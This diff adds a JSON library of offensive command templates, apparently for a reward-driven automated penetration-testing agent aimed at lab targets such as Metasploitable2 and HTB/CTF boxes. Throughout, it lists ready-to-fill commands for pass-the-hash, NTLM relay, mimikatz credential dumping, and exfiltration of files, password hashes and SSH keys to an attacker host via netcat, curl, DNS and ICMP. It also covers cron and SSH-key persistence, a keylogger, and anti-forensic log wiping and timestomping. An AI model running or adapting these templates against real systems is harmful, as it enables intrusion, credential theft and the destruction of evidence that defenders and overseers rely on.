+        "automated",
+        "linux"
+      ],
+      "typical_reward": 12.0
+    },
+    "sharphound": {
+      "template": ".\\SharpHound.exe -c All",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "SharpHound collection from Windows. Generates zip for BloodHound.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "domain_joined",
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "Done",
+        ".zip",
+        "Compressing"
+      ],
+      "tags": [
+        "windows",
+        "bloodhound",
+        "collection"
+      ],
+      "typical_reward": 5.0
+    },
+    "impacket_pth_psexec": {
+      "template": "impacket-psexec {domain}/{username}@{target} -hashes :{hash}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "PsExec with NTLM hash (pass-the-hash).",
+      "required_params": [
+        "target",
+        "username",
+        "hash"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "smb_service_found",
+        "hash_known"
+      ],
+      "success_indicators": [
+        "Microsoft Windows",
+        "C:\\"
+      ],
+      "tags": [
+        "pth",
+        "impacket",
+        "lateral"
+      ],
+      "typical_reward": 8.0
+    },
+    "crackmapexec_pth": {
+      "template": "crackmapexec smb {target} -u {username} -H {hash}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Test hash against multiple targets.",
+      "required_params": [
+        "target",
+        "username",
+        "hash"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "hash_known"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d!"
+      ],
+      "tags": [
+        "pth",
+        "cme",
+        "spray"
+      ],
+      "typical_reward": 6.0
+    },
+    "responder": {
+      "template": "responder -I {interface} -dwPv",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "LLMNR/NBT-NS poisoner. Captures NetNTLM hashes.",
+      "required_params": [
+        "interface"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "network_access"
+      ],
+      "success_indicators": [
+        "NTLMv2",
+        "Hash",
+        "[+]"
+      ],
+      "tags": [
+        "hashes",
+        "mitm",
+        "responder"
+      ],
+      "typical_reward": 5.0
+    },
+    "ntlmrelayx": {
+      "template": "impacket-ntlmrelayx -tf {targets} -smb2support -i",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "NTLM relay attack. Relay captured hashes to other hosts.",
+      "required_params": [
+        "targets"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_signing_disabled"
+      ],
+      "success_indicators": [
+        "Servers started",
+        "HTTPD",
+        "SMBD"
+      ],
+      "tags": [
+        "impacket",
+        "relay",
+        "mitm"
+      ],
+      "typical_reward": 7.0
+    },
+    "chisel_server": {
+      "template": "chisel server --reverse --port {port}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Start chisel reverse proxy server on attacker.",
+      "required_params": [
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "server",
+        "listening"
+      ],
+      "tags": [
+        "proxy",
+        "tunnel",
+        "chisel"
+      ],
+      "typical_reward": 3.0
+    },
+    "chisel_client": {
+      "template": "chisel client {lhost}:{lport} R:{remote_port}:127.0.0.1:{target_port}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Connect chisel client to forward internal ports to attacker.",
+      "required_params": [
+        "lhost",
+        "lport",
+        "remote_port",
+        "target_port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "connected",
+        "session"
+      ],
+      "tags": [
+        "proxy",
+        "tunnel",
+        "port-forward",
+        "chisel"
+      ],
+      "typical_reward": 5.0
+    },
+    "ligolo_agent": {
+      "template": "./agent -connect {server}:11601 -ignore-cert",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Ligolo-ng agent for tunneling through compromised host.",
+      "required_params": [
+        "server"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "Agent",
+        "connected"
+      ],
+      "tags": [
+        "ligolo",
+        "tunneling"
+      ],
+      "typical_reward": 3.0
+    },
+    "ssh_tunnel_local": {
+      "template": "ssh -L {local_port}:127.0.0.1:{remote_port} {user}@{target} -N -f",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "SSH local port forward to access internal services.",
+      "required_params": [
+        "local_port",
+        "remote_port",
+        "user",
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "ssh_service_found"
+      ],
+      "success_indicators": [
+        "forwarding"
+      ],
+      "tags": [
+        "port-forward",
+        "tunnel",
+        "ssh"
+      ],
+      "typical_reward": 5.0
+    },
+    "ssh_tunnel_dynamic": {
+      "template": "ssh -D {port} {username}@{pivot}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "SSH SOCKS proxy for dynamic port forwarding.",
+      "required_params": [
+        "port",
+        "username",
+        "pivot"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ssh_access"
+      ],
+      "success_indicators": [
+        "bind"
+      ],
+      "tags": [
+        "proxy",
+        "socks",
+        "ssh"
+      ],
+      "typical_reward": 3.0
+    },
+    "pivot_scan": {
+      "template": "for i in $(seq 1 254); do ping -c 1 -W 1 {subnet}.$i 2>/dev/null | grep 'bytes from' & done; wait",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Ping sweep internal subnet from compromised host.",
+      "required_params": [
+        "subnet"
+      ],
+      "optional_params": {
+        "subnet": "10.10.10"
+      },
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "bytes from",
+        "64 bytes"
+      ],
+      "tags": [
+        "lateral",
+        "pivot",
+        "network"
+      ],
+      "typical_reward": 5.0
+    },
+    "nmap_pivot": {
+      "template": "nmap -sT -Pn --top-ports 20 {target}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Port scan internal target through pivot host.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "open",
+        "filtered"
+      ],
+      "tags": [
+        "nmap",
+        "lateral",
+        "pivot"
+      ],
+      "typical_reward": 4.0
+    },
+    "proxychains_scan": {
+      "template": "proxychains nmap -sT -Pn {target} --top-ports 100",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Scan internal network through SOCKS proxy.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "socks_proxy_set"
+      ],
+      "success_indicators": [
+        "open",
+        "filtered"
+      ],
+      "tags": [
+        "lateral",
+        "pivot",
+        "proxychains"
+      ],
+      "typical_reward": 4.0
+    },
+    "winrm_exec": {
+      "template": "evil-winrm -i {target} -u {username} -p {password}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "Get interactive PowerShell via WinRM.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "winrm_service_found",
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "Evil-WinRM",
+        "PS >"
+      ],
+      "tags": [
+        "winrm",
+        "powershell",
+        "lateral"
+      ],
+      "typical_reward": 7.0
+    },
+    "ssh_lateral": {
+      "template": "ssh {username}@{target}",
+      "phase": "LATERAL_MOVEMENT",
+      "description": "SSH to internal host using harvested credentials.",
+      "required_params": [
+        "target",
+        "username"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "ssh_service_found"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "Last login"
+      ],
+      "tags": [
+        "lateral",
+        "ssh"
+      ],
+      "typical_reward": 6.0
+    },
+    "nc_exfil": {
+      "template": "nc {attacker} {port} < {file}",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate file via netcat.",
+      "required_params": [
+        "attacker",
+        "port",
+        "file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "netcat",
+        "exfil"
+      ],
+      "typical_reward": 2.0
+    },
+    "curl_exfil": {
+      "template": "curl -X POST -d @{file} http://{attacker}:{port}/",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate file via HTTP POST.",
+      "required_params": [
+        "file",
+        "attacker",
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "http",
+        "exfil"
+      ],
+      "typical_reward": 2.0
+    },
+    "scp_exfil": {
+      "template": "{ echo 'tar czf - /etc/passwd /etc/shadow /home 2>/dev/null | base64'; sleep 3; } | timeout 15 telnet {target} 1524",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate key files via base64 over ingreslock backdoor.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "base64",
+        "H4sI"
+      ],
+      "tags": [
+        "exfil",
+        "base64"
+      ],
+      "typical_reward": 5.0
+    },
+    "exfil_data": {
+      "template": "tar czf /tmp/.data.tar.gz {path} && curl -X POST -F 'file=@/tmp/.data.tar.gz' http://{attacker}:{port}/upload",
+      "phase": "EXFILTRATION",
+      "description": "Archive and exfiltrate target data via HTTP POST.",
+      "required_params": [
+        "path",
+        "attacker",
+        "port"
+      ],
+      "optional_params": {
+        "path": "/etc/",
+        "attacker": "10.10.14.1",
+        "port": "8888"
+      },
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "100%",
+        "uploaded"
+      ],
+      "tags": [
+        "archive",
+        "http",
+        "exfil"
+      ],
+      "typical_reward": 8.0
+    },
+    "dns_exfil": {
+      "template": "for line in $(base64 {file} | fold -w 60); do dig $line.{domain} @{dns_server}; done",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate data via DNS queries (stealthy).",
+      "required_params": [
+        "file",
+        "domain",
+        "dns_server"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "NOERROR"
+      ],
+      "tags": [
+        "dns",
+        "exfil",
+        "stealth"
+      ],
+      "typical_reward": 6.0
+    },
+    "icmp_exfil": {
+      "template": "xxd -p {file} | while read line; do ping -c 1 -p $line {attacker}; done",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate data via ICMP ping payloads (very stealthy).",
+      "required_params": [
+        "file",
+        "attacker"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "bytes from"
+      ],
+      "tags": [
+        "icmp",
+        "exfil",
+        "stealth"
+      ],
+      "typical_reward": 5.0
+    },
+    "base64_exfil": {
+      "template": "base64 {file} | xclip -selection clipboard",
+      "phase": "EXFILTRATION",
+      "description": "Base64 encode file for manual exfiltration via clipboard.",
+      "required_params": [
+        "file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "exfil",
+        "base64",
+        "manual"
+      ],
+      "typical_reward": 3.0
+    },
+    "smb_exfil": {
+      "template": "smbclient //{attacker}/share -N -c 'put {file}'",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate file to attacker SMB share.",
+      "required_params": [
+        "attacker",
+        "file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "putting file"
+      ],
+      "tags": [
+        "smb",
+        "exfil"
+      ],
+      "typical_reward": 5.0
+    },
+    "exfil_shadow": {
+      "template": "{ echo 'base64 /etc/shadow'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "EXFILTRATION",
+      "description": "Exfiltrate /etc/shadow via base64 encoding through ingreslock.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        "cm9vd",
+        "base64"
+      ],
+      "tags": [
+        "ms2",
+        "exfil",
+        "credential"
+      ],
+      "typical_reward": 30.0
+    },
+    "exfil_ssh_keys": {
+      "template": "{ echo 'find /home /root /etc -name id_rsa -o -name id_dsa 2>/dev/null | head -5 | xargs cat 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
+      "phase": "EXFILTRATION",
+      "description": "Find and exfiltrate SSH private keys via ingreslock.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        "BEGIN",
+        "PRIVATE KEY",
+        "RSA"
+      ],
+      "tags": [
+        "ms2",
+        "exfil",
+        "credential",
+        "ssh"
+      ],
+      "typical_reward": 35.0
+    },
+    "exfil_mysql_dump": {
+      "template": "mysqldump -h {target} -u root --all-databases 2>/dev/null | head -100",
+      "phase": "EXFILTRATION",
+      "description": "Dump MySQL databases for exfiltration.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "CREATE",
+        "INSERT",
+        "Database"
+      ],
+      "tags": [
+        "ms2",
+        "exfil",
+        "database"
+      ],
+      "typical_reward": 25.0
+    },
+    "impacket_secretsdump": {
+      "template": "impacket-secretsdump {domain}/{username}:{password}@{target}",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump SAM/NTDS hashes. Get all domain credentials.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "admin_access_obtained"
+      ],
+      "success_indicators": [
+        "Administrator:",
+        ":500:",
+        ":::"
+      ],
+      "tags": [
+        "dump",
+        "hashes",
+        "impacket"
+      ],
+      "typical_reward": 10.0
+    },
+    "secretsdump_dc": {
+      "template": "impacket-secretsdump -just-dc {domain}/{username}:{password}@{target}",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump NTDS.dit from domain controller. All domain hashes.",
+      "required_params": [
+        "target",
+        "domain",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "domain_admin_obtained"
+      ],
+      "success_indicators": [
+        "Dumping Domain Credentials",
+        ":::"
+      ],
+      "tags": [
+        "dc",
+        "impacket",
+        "ntds"
+      ],
+      "typical_reward": 15.0
+    },
+    "mimikatz_logonpasswords": {
+      "template": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump passwords from memory. Need admin.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "mimikatz_uploaded",
+        "windows_admin_obtained"
+      ],
+      "success_indicators": [
+        "Username :",
+        "Password :",
+        "NTLM"
+      ],
+      "tags": [
+        "memory",
+        "dump",
+        "mimikatz"
+      ],
+      "typical_reward": 10.0
+    },
+    "mimikatz_sam": {
+      "template": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump SAM database for local hashes.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "windows_admin_obtained"
+      ],
+      "success_indicators": [
+        "RID  :",
+        "Hash NTLM:"
+      ],
+      "tags": [
+        "local",
+        "sam",
+        "mimikatz"
+      ],
+      "typical_reward": 8.0
+    },
+    "mimikatz_dcsync": {
+      "template": "mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:{username}\" \"exit\"",
+      "phase": "POST_EXPLOITATION",
+      "description": "DCSync - replicate credentials from DC. Need replication rights.",
+      "required_params": [
+        "domain",
+        "username"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "dcsync_rights"
+      ],
+      "success_indicators": [
+        "Hash NTLM:",
+        "Credentials:"
+      ],
+      "tags": [
+        "ad",
+        "dcsync",
+        "mimikatz"
+      ],
+      "typical_reward": 12.0
+    },
+    "cron_backdoor": {
+      "template": "echo '* * * * * {command}' >> /var/spool/cron/crontabs/{user}",
+      "phase": "POST_EXPLOITATION",
+      "description": "Add cron job for persistence.",
+      "required_params": [
+        "command",
+        "user"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "persistence",
+        "cron",
+        "linux"
+      ],
+      "typical_reward": 5.0
+    },
+    "ssh_key_persistence": {
+      "template": "echo '{public_key}' >> /home/{user}/.ssh/authorized_keys",
+      "phase": "POST_EXPLOITATION",
+      "description": "Add SSH key for persistent access.",
+      "required_params": [
+        "public_key",
+        "user"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "persistence",
+        "linux",
+        "ssh"
+      ],
+      "typical_reward": 5.0
+    },
+    "credential_dump": {
+      "template": "cat /etc/shadow 2>/dev/null || hashdump",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump system credential hashes for offline cracking.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        "root:",
+        "$6$",
+        "$y$",
+        "::"
+      ],
+      "tags": [
+        "post",
+        "credentials",
+        "dump"
+      ],
+      "typical_reward": 10.0
+    },
+    "hashdump": {
+      "template": "cat /etc/shadow | grep -v '!' | grep -v '*'",
+      "phase": "POST_EXPLOITATION",
+      "description": "Extract password hashes from shadow file.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        "$6$",
+        "$5$",
+        "$1$",
+        "root:"
+      ],
+      "tags": [
+        "post",
+        "hashes",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "keylogger_deploy": {
+      "template": "(script -q /tmp/.keylog </dev/null &>/dev/null &) && echo 'keylogger started' && ls -la /tmp/.keylog 2>/dev/null || echo 'deployed'",
+      "phase": "POST_EXPLOITATION",
+      "description": "Deploy basic keylogger to capture terminal input.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "nohup",
+        "started"
+      ],
+      "tags": [
+        "post",
+        "keylogger",
+        "persistence"
+      ],
+      "typical_reward": 4.0
+    },
+    "history_dump": {
+      "template": "cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump command history for credentials and patterns.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "ssh",
+        "mysql",
+        "password",
+        "wget"
+      ],
+      "tags": [
+        "post",
+        "recon",
+        "history"
+      ],
+      "typical_reward": 5.0
+    },
+    "network_config_dump": {
+      "template": "ifconfig 2>/dev/null || ip addr && ip route && cat /etc/resolv.conf",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump network configuration for internal network mapping.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "inet",
+        "eth0",
+        "default via"
+      ],
+      "tags": [
+        "post",
+        "recon",
+        "network"
+      ],
+      "typical_reward": 4.0
+    },
+    "ssh_key_harvest": {
+      "template": "find /home /root /etc /opt -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
+      "phase": "POST_EXPLOITATION",
+      "description": "Find SSH private keys for lateral movement.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "id_rsa",
+        "id_ed25519",
+        ".pem"
+      ],
+      "tags": [
+        "post",
+        "ssh_keys",
+        "lateral"
+      ],
+      "typical_reward": 7.0
+    },
+    "cleanup_logs": {
+      "template": "echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c",
+      "phase": "POST_EXPLOITATION",
+      "description": "Clear system logs and bash history to cover tracks.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "post",
+        "cleanup",
+        "antiforensics"
+      ],
+      "typical_reward": 5.0
+    },
+    "timestomp": {
+      "template": "touch -r /etc/hosts {file}",
+      "phase": "POST_EXPLOITATION",
+      "description": "Modify file timestamps to match reference file (anti-forensics).",
+      "required_params": [
+        "file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "post",
+        "timestomp",
+        "antiforensics"
+      ],
+      "typical_reward": 3.0
+    },
+    "dump_shadow": {
+      "template": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump /etc/shadow for password hashes via ingreslock backdoor.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        "root:",
+        "$1$",
+        "$6$",
+        "$y$"
+      ],
+      "tags": [
+        "ms2",
+        "post-exploit",
+        "credential"
+      ],
+      "typical_reward": 25.0
+    },
+    "dump_passwd": {
+      "template": "{ echo 'cat /etc/passwd'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "POST_EXPLOITATION",
+      "description": "Dump /etc/passwd to enumerate all system users via ingreslock.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "root:",
+        "/bin/bash",
+        "/bin/sh",
+        "msfadmin"
+      ],
+      "tags": [
+        "ms2",
+        "post-exploit",
+        "enum"
+      ],
+      "typical_reward": 10.0
+    },
+    "plant_ssh_key": {
+      "template": "{ echo 'mkdir -p /root/.ssh && echo ssh-rsa_AAAA_ariaska_key >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo PERSISTENCE_OK'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "POST_EXPLOITATION",
+      "description": "Plant SSH authorized key for persistent root access via ingreslock.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "ms2",
+        "persistence",
+        "ssh"
+      ],
+      "typical_reward": 20.0
+    },
+    "read_user_flag": {
+      "template": "cat /home/*/user.txt 2>/dev/null || find / -name user.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null",
+      "phase": "POST_EXPLOITATION",
+      "description": "Read user flag from target (HTB/CTF)",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "htb",
+        "ctf",
+        "flag",
+        "loot"
+      ],
+      "typical_reward": 200.0
+    },
+    "read_root_flag": {
+      "template": "cat /root/root.txt 2>/dev/null || find / -name root.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null",
+      "phase": "POST_EXPLOITATION",
+      "description": "Read root flag from target (HTB/CTF)",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "admin_access"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "htb",
+        "ctf",
+        "flag",
+        "loot"
+      ],
+      "typical_reward": 200.0
+    },
+    "remove_uploaded_tools": {
+      "template": "{ echo 'find /tmp /dev/shm /var/tmp -newer /etc/passwd -type f -exec rm -f {} \\; 2>/dev/null && echo CLOSEOUT_TOOLS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Remove attack tools we uploaded to temp directories. Undo our artifacts.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_TOOLS_REMOVED"
+      ],
+      "tags": [
+        "restore",
+        "tools",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "remove_ssh_keys_planted": {
+      "template": "{ echo 'sed -i \"/attacker/d\" /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null && echo CLOSEOUT_KEYS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Remove SSH keys we planted in authorized_keys. Undo our persistence.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_KEYS_REMOVED"
+      ],
+      "tags": [
+        "persistence",
+        "ssh",
+        "restore",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "remove_cron_backdoors": {
+      "template": "{ echo 'crontab -r 2>/dev/null; find /var/spool/cron -newer /etc/passwd -exec rm -f {} \\; && echo CLOSEOUT_CRON_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Remove cron-based persistence we installed. Undo our scheduled tasks.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_CRON_REMOVED"
+      ],
+      "tags": [
+        "persistence",
+        "closeout",
+        "restore",
+        "cron",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "verify_target_stable": {
+      "template": "{ echo 'uptime && ps aux | wc -l && df -h / | tail -1 && echo TARGET_STABLE_VERIFIED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Verify target system is stable after our engagement. Check uptime, processes, disk.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "TARGET_STABLE_VERIFIED"
+      ],
+      "tags": [
+        "health",
+        "closeout",
+        "verify",
+        "linux"
+      ],
+      "typical_reward": 10.0
+    },
+    "cleanup_tmp_artifacts": {
+      "template": "{ echo 'rm -f /tmp/ariaska_* /tmp/payload_* /tmp/exploit_* /dev/shm/.* 2>/dev/null && echo CLOSEOUT_TMP_CLEANED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Remove temporary artifacts created during engagement from /tmp and /dev/shm.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_TMP_CLEANED"
+      ],
+      "tags": [
+        "restore",
+        "tmp",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "clear_bash_history": {
+      "template": "{ echo 'cat /dev/null > ~/.bash_history && history -c && echo CLOSEOUT_HISTORY_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Clear bash command history to remove evidence of executed commands.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_HISTORY_CLEARED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "history",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 7.0
+    },
+    "clear_auth_logs": {
+      "template": "{ echo 'cat /dev/null > /var/log/auth.log && cat /dev/null > /var/log/secure 2>/dev/null && echo CLOSEOUT_AUTH_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Clear authentication logs (auth.log, secure) to remove login evidence.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_AUTH_CLEARED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "logs",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "clear_wtmp_btmp": {
+      "template": "{ echo 'cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp && cat /dev/null > /var/log/lastlog && echo CLOSEOUT_LOGIN_LOGS_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Clear wtmp/btmp/lastlog to remove login session records.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_LOGIN_LOGS_CLEARED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "logs",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 7.0
+    },
+    "shred_sensitive_files": {
+      "template": "{ echo 'shred -vfz -n 3 /tmp/loot* /tmp/dump* /tmp/*.tar.gz 2>/dev/null && echo CLOSEOUT_FILES_SHREDDED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Securely shred (overwrite+delete) any sensitive files left behind.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_FILES_SHREDDED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "shred",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 7.0
+    },
+    "timestomp_closeout": {
+      "template": "{ echo 'find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {{}} \\; 2>/dev/null && echo CLOSEOUT_TIMESTAMPS_FIXED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Reset timestamps on modified files to blend with original system files.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
